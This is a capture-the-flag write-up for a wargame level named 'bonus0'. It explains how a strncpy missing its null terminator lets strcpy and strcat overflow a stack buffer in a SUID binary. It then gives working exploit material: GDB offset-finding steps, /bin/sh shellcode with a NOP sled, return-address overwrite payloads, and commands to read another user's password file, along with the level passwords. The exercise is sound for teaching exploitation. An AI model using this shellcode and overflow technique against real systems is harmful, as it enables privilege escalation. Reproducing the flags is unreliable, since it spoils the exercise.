# bonus0

## 1. Connect to the VM

The password for `bonus0`, obtained by solving `level9`, is:

```text
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

Connect with:

```bash
ssh bonus0@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

`p()` reads up to 4096 bytes from stdin, strips the newline, then copies at
most 20 bytes into the caller's buffer:

```c
read(0, buf, 4096);
*strchr(buf, '\n') = 0;
return strncpy(dest, buf, 20);
```

`pp()` calls `p()` twice into two adjacent 20-byte arrays, then concatenates
them into the caller's buffer:

```c
char first[20];
char last[20];
p(first, " - ");
p(last, " - ");
strcpy(dest, first);
size_t len = strlen(dest);
dest[len] = ' ';
dest[len + 1] = '\0';
return strcat(dest, last);
```

`main()` passes a 42-byte stack buffer to `pp()` and prints the result:

```c
char s[42];
pp(s);
puts(s);
```

## 3. Disassemble / Analyse the binary

The binary is owned by `bonus1` and has the SUID bit set. It therefore runs
with `bonus1` privileges.

`strncpy` does not null-terminate when the source exactly fills the 20-byte
limit. Providing exactly 20 bytes leaves both `first` and `last` without a `\0`.

`strcpy(dest, first)` reads past `first` into `last`, then through `pp()`'s
saved registers until hitting a null byte, roughly 44 bytes into `dest`.
`strcat(dest, last)` then seeks to that null and appends `last` the same way,
adding another ~24 bytes. The combined ~68-byte write overflows the 42-byte
`s[]` and corrupts `main()`'s saved return address.

The disassembly of `main` confirms that `s` is allocated at `esp+0x16`:

```gdb
(gdb) disas main
   0x080485a4 <+0>:   push   ebp
   0x080485a5 <+1>:   mov    ebp,esp
   0x080485a7 <+3>:   and    esp,0xfffffff0
   0x080485aa <+6>:   sub    esp,0x40
   0x080485ad <+9>:   lea    eax,[esp+0x16]
   0x080485b1 <+13>:  mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:  call   0x804851e <pp>
   0x080485b9 <+21>:  lea    eax,[esp+0x16]
   0x080485bd <+25>:  mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:  call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:  mov    eax,0x0
   0x080485ca <+38>:  leave
   0x080485cb <+39>:  ret
```

## 4. Find the offset

Start GDB, strip the environment variables that shift the stack, and break
after `pp` returns. Provide any safe input when `pp` prompts during `r`:

```gdb
(gdb) unset env COLUMNS
(gdb) unset env LINES
(gdb) b *main+21
(gdb) r
```

Read `s`'s address and `main()`'s return address slot. `$ebp+4` always holds
the return address of the current function:

```gdb
(gdb) p/x $esp + 0x16
$1 = 0xbffffc46
(gdb) x/xw $ebp + 4
0xbffffc7c:   0xb7e454d3
```

The distance from `s` to the return address:

```text
0xbffffc7c - 0xbffffc46 = 0x36 = 54 bytes
```

Verify with a cyclic pattern inside GDB. The return address is written by the
`strcat` pass, so place the pattern in the second input only:

```gdb
(gdb) r < <(python -c 'print "A"*20'; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa"')
```

GDB catches the SIGSEGV and shows `EIP = 0x41336141`. Stored in little-endian that is `Aa3A`, which
begins at **byte 9** of the pattern. The return address therefore starts at
**byte 9 of the second input**.

Stack layout after `pp()` returns:

```text
s+0               s+20              s+44  s+45
+------------------+------------------+----+------------------+----+
| first (20 bytes) | last  (strcpy)   |ebx | last  (strcat)   |ebx |
+------------------+------------------+----+------------------+----+
                                           ^ strcat appends here
                                                [9]       [13]
                                                      ^ return addr at s+54
```

## 5. Exploit the binary

Place a NOP sled followed by shellcode in an environment variable:

```bash
export EGG=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x99\xb0\x0b\xcd\x80"')
```

Find its address in GDB with `COLUMNS` and `LINES` still unset. `getenv`
returns a pointer directly to the variable's value, which is the first `\x90`
of the sled:

```gdb
(gdb) b main
(gdb) r
(gdb) p/x getenv("EGG")
$1 = 0xbffffdab
```

Target the midpoint of the sled to absorb small address variations at runtime:

```text
0xbffffdab + 0x64 = 0xbffffe0f
```

In little-endian: `\x0f\xfe\xff\xbf`.

Run the exploit interactively:

```bash
(python -c 'print "\x90"*20'; \
 python -c 'print "A"*9 + "\x0f\xfe\xff\xbf" + "A"*7'; \
 cat) | ./bonus0
```

The first input fills `first` with NOP bytes. The second input places the
return address at byte 9. `cat` keeps stdin open for the resulting shell.

Verify and read the flag:

```bash
id
cat /home/bonus1/.pass
```

The output contains:

```text
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Non-interactive one-liner:

```bash
(python -c 'print "\x90"*20'; python -c 'print "A"*9 + "\x0f\xfe\xff\xbf" + "A"*7'; echo "cat /home/bonus1/.pass") | ./bonus0
```
